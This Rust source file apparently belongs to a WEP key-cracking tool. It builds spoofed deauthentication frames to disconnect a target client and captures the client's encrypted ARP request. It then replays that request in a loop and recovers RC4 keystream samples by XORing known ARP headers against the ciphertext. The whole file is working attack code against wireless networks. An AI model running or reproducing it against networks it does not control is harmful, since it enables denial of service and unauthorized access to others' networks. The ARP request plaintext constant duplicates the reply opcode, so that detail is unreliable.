use std::{
    rc::Rc,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
    thread::JoinHandle,
    time::{Duration, Instant},
};

use anyhow::Context;
use ieee80211::{
    DSStatus, DataFrame, DataFrameTrait, DataSubtype, DeauthenticationFixedParametersBuilderTrait,
    DeauthenticationFrameBuilder, FragmentSequenceTrait, Frame, FrameBuilderTrait, FrameLayer,
    FrameSubtype, FrameTrait, FrameType, FrameVersion, MacAddress, ManagementFrameBuilderTrait,
    ManagementSubtype,
};

use crate::{
    ieee80211::{IEEE80211Monitor, IEEE80211PacketSniffer},
    keycracker::KeystreamSample,
    wep::WepIV,
};

pub struct ARPSampleSupplier {
    replay_thread: Option<JoinHandle<()>>,
    acceptor_thread: Option<JoinHandle<()>>,

    should_exit: Arc<AtomicBool>,
    sample_queue: Arc<concurrent_queue::ConcurrentQueue<KeystreamSample>>,
}

impl ARPSampleSupplier {
    const ARP_PACKET_SIZE: usize = 28;

    pub fn try_capture_arp_request(
        ap_mac: &MacAddress,
        dev_mac: &MacAddress,
        sniffer: &mut IEEE80211PacketSniffer,
    ) -> anyhow::Result<Option<Frame<'static>>> {
        sniffer
            .set_timeout(Some(Duration::from_secs(5)))
            .context("failed to set sniffer timeout")?;

        //Send a deauth request
        let mut deauth = DeauthenticationFrameBuilder::new();
        deauth.version(FrameVersion::Standard);
        deauth.type_(FrameType::Management);
        deauth.subtype(FrameSubtype::Management(
            ManagementSubtype::Deauthentication,
        ));
        deauth.ds_status(DSStatus::NotLeavingDSOrADHOC);
        deauth.source_address(*ap_mac);
        deauth.bssid_address(*ap_mac);
        deauth.destination_address(*dev_mac);
        deauth.reason_code(ieee80211::ReasonCode::Inactivity);

        sniffer
            .inject_frame(&deauth.build())
            .context("failed to inject deauth packet")?;

        //Sniff packets for an ARP-Request for a bit
        const TIMEOUT: Duration = Duration::from_secs(1);

        sniffer
            .set_timeout(Some(TIMEOUT))
            .expect("failed to set 802.11 sniffer timeout");

        let start_time = Instant::now();
        while start_time.elapsed() < TIMEOUT {
            //Receive a packet
            let packet = sniffer
                .sniff_packet()
                .expect("failed to sniff ARP request packet");

            let Some(packet) = packet else {
                break;
            };
            let frame = packet.ieee80211_frame();

            //Check if this is an encrypted broadcast packet from our target device
            let Some(FrameLayer::Data(data)) = frame.next_layer() else {
                continue;
            };

            if !data.protected()
                || data.source_address() != Some(*dev_mac)
                || !data
                    .destination_address()
                    .map_or(false, |dst| dst.is_broadcast())
            {
                continue;
            }

            //Check if this most likely is an ARP request
            let mut index = DataFrame::FRAGMENT_SEQUENCE_START + 2;
            if matches!(data.subtype(), FrameSubtype::Data(DataSubtype::QoSData)) {
                index += 2;
            }

            let data_len = data.bytes().len() - 8 - (index + 4); //Last 8 bytes are garbage (ICV + FCS)

            if data_len == 8 + Self::ARP_PACKET_SIZE {
                return Ok(Some(Frame::new(Vec::from(
                    &frame.bytes()[..frame.bytes().len() - 4],
                ))));
            }
        }

        Ok(None)
    }

    pub fn new(
        monitor: Rc<IEEE80211Monitor>,
        dev_mac: MacAddress,
        ap_mac: MacAddress,
        arp_request: Frame<'static>,
    ) -> Self {
        let sample_queue = Arc::new(concurrent_queue::ConcurrentQueue::unbounded());
        let should_exit = Arc::new(AtomicBool::new(false));

        //Launch the threads
        let replay_thread = {
            let sniffer = monitor
                .create_sniffer()
                .expect("failed to create sniffer for replay thread");

            let should_exit = should_exit.clone();
            Some(std::thread::spawn(move || {
                Self::replay_thread_fnc(sniffer, arp_request, should_exit.as_ref())
            }))
        };

        let acceptor_thread = {
            let sniffer = monitor
                .create_sniffer()
                .expect("failed to create sniffer for acceptor thread");

            let sample_queue = sample_queue.clone();
            let should_exit = should_exit.clone();
            Some(std::thread::spawn(move || {
                Self::acceptor_thread(
                    sniffer,
                    sample_queue.as_ref(),
                    ap_mac,
                    dev_mac,
                    should_exit.as_ref(),
                )
            }))
        };

        ARPSampleSupplier {
            replay_thread,
            acceptor_thread,

            sample_queue,
            should_exit,
        }
    }

    fn replay_thread_fnc(
        mut sniffer: IEEE80211PacketSniffer,
        arp_request: Frame<'static>,
        should_exit: &AtomicBool,
    ) {
        while !should_exit.load(Ordering::SeqCst) {
            sniffer
                .inject_frame(&arp_request)
                .expect("failed to inject replayed ARP request");

            std::thread::sleep(Duration::from_micros(3500));
        }
    }

    fn acceptor_thread(
        mut sniffer: IEEE80211PacketSniffer,
        sample_queue: &concurrent_queue::ConcurrentQueue<KeystreamSample>,
        ap_mac: MacAddress,
        dev_mac: MacAddress,
        should_exit: &AtomicBool,
    ) {
        while !should_exit.load(Ordering::SeqCst) {
            //Receive a response packet
            let packet = sniffer
                .sniff_packet()
                .expect("failed to sniff ARP response packet");

            let Some(packet) = packet else {
                continue;
            };
            let frame = packet.ieee80211_frame();

            //Check if this is an encrypted response packet to our target device
            let Some(FrameLayer::Data(data)) = frame.next_layer() else {
                continue;
            };

            if !data.protected()
                || !(data.transmitter_address() == Some(dev_mac)
                    || data.transmitter_address() == Some(ap_mac)
                    || data.destination_address() == Some(dev_mac))
            {
                continue;
            }

            //Get the IV from the packet
            let mut index = DataFrame::FRAGMENT_SEQUENCE_START + 2;
            if matches!(data.subtype(), FrameSubtype::Data(DataSubtype::QoSData)) {
                index += 2;
            }
            let mut iv = WepIV::default();
            iv.copy_from_slice(&data.bytes()[index..index + 3]);

            let payload = &data.bytes()[index + 4..data.bytes().len() - 8]; //Last 8 bytes are garbage (ICV + FCS)

            //Check if this most likely is an ARP response
            if payload.len() == 8 + Self::ARP_PACKET_SIZE {
                const ARP_REQ_PLAINTEXT: [u8; 16] = [
                    0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06, 0x00, 0x01, 0x08, 0x00, 0x06,
                    0x04, 0x00, 0x02,
                ];
                const ARP_RESP_PLAINTEXT: [u8; 16] = [
                    0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06, 0x00, 0x01, 0x08, 0x00, 0x06,
                    0x04, 0x00, 0x02,
                ];

                //Recover the keystream
                let plaintext = if data.destination_address().unwrap().is_broadcast() {
                    &ARP_REQ_PLAINTEXT
                } else {
                    &ARP_RESP_PLAINTEXT
                };

                let mut keystream = [0u8; KeystreamSample::KEYSTREAM_LEN];
                for i in 0..16 {
                    keystream[i] = payload[i] ^ plaintext[i];
                }

                //Put it into the queue
                if sample_queue
                    .push(KeystreamSample { keystream, iv })
                    .is_err()
                {
                    panic!("failed to push sample to queue");
                }
            }
        }
    }

    pub fn provide_sample(&mut self, should_exit: &AtomicBool) -> Option<KeystreamSample> {
        const TIMEOUT: Duration = Duration::from_millis(10);

        let replay_thread = self.replay_thread.as_ref().unwrap();
        let acceptor_thread = self.acceptor_thread.as_ref().unwrap();

        let start = Instant::now();
        while !should_exit.load(Ordering::SeqCst) && start.elapsed() < TIMEOUT {
            //Ensure neither thread has finished
            if replay_thread.is_finished() {
                if let Some(Err(e)) = self.replay_thread.take().map(JoinHandle::join) {
                    std::panic::resume_unwind(e);
                } else {
                    panic!("replay thread exited prematurely");
                }
            }

            if acceptor_thread.is_finished() {
                if let Some(Err(e)) = self.acceptor_thread.take().map(JoinHandle::join) {
                    std::panic::resume_unwind(e);
                } else {
                    panic!("acceptor thread exited prematurely");
                }
            }

            //Pop a sample from the queue
            match self.sample_queue.pop() {
                Ok(sample) => return Some(sample),
                Err(concurrent_queue::PopError::Empty) => std::thread::yield_now(),
                Err(e) => panic!("failed to pop sample from queue: {e}"),
            }
        }

        None
    }
}

impl Drop for ARPSampleSupplier {
    fn drop(&mut self) {
        self.should_exit.store(true, Ordering::SeqCst);

        if let Some(Err(e)) = self.replay_thread.take().map(JoinHandle::join) {
            std::panic::resume_unwind(e);
        }

        if let Some(Err(e)) = self.acceptor_thread.take().map(JoinHandle::join) {
            std::panic::resume_unwind(e);
        }
    }
}
